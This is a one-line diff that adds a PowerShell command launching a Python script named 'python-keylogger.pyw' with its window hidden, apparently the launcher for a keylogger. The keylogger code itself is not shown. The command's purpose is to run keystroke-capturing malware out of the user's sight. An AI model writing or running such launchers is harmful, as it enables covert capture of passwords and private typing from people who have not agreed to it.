@@ -1,0 +1,1 @@
+Powershell.exe -windowstyle hidden {python <YOUR-DIRECTORY>\python-keylogger.pyw}
